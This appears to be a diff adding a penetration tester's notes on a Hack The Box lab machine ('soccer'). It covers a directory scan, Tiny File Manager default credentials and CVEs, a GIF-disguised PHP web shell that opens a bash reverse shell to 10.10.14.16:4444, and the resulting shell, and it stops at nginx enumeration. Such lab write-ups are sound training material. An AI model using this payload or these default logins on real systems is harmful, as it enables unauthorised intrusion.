@@ -1,0 +1,94 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# feroxbuster -u http://soccer.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
+                                                                                                                     
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://soccer.htb/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
+200      GET      147l      526w     6917c http://soccer.htb/
+200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
+200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
+200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
+301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
+301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
+200      GET       96l     1750w    11521c http://soccer.htb/tiny/
+[####################] - 2m    323972/323972  0s      found:8       errors:0      
+[####################] - 2m    107983/107983  1109/s  http://soccer.htb/ 
+[####################] - 2m    107983/107983  1106/s  http://soccer.htb/tiny/ 
+[####################] - 2m    107983/107983  1107/s  http://soccer.htb/tiny/uploads/  
+
+
+
+
+tiny file manager has default credentials
+Default username/password: admin/admin@123 and user/12345.
+
+Tiny File Manager 2.4.3
+https://www.exploit-db.com/exploits/50828
+Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
+
+CVE:
+2021-45010 
+2021-40964
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat revshell.gif.php
+GIF89a
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'"); ?>
+                                                                                                                     
+we upload, open.
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444        
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.194] 54516
+bash: cannot set terminal process group (1079): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@soccer:~/html/tiny/uploads$ 
+
+
+"Enumerating the target system as the www-data user yields no interesting vectors or files, however,
+remembering that the web application is running on Nginx , we take a look at the sites-enabled directory
+for possible subdomains that weren't detected during our initial enumeration"
+
+www-data@soccer:/etc/nginx/sites-enabled$ ls -la
+total 8
+drwxr-xr-x 2 root root 4096 Dec  1  2022 .
+drwxr-xr-x 8 root root 4096 Nov 17  2022 ..
+lrwxrwxrwx 1 root root   34 Nov 17  2022 default -> /etc/nginx/sites-available/default
+lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
+www-data@soccer:/etc/nginx/sites-enabled$ 
+
+
+
+
+
+
+
+
+
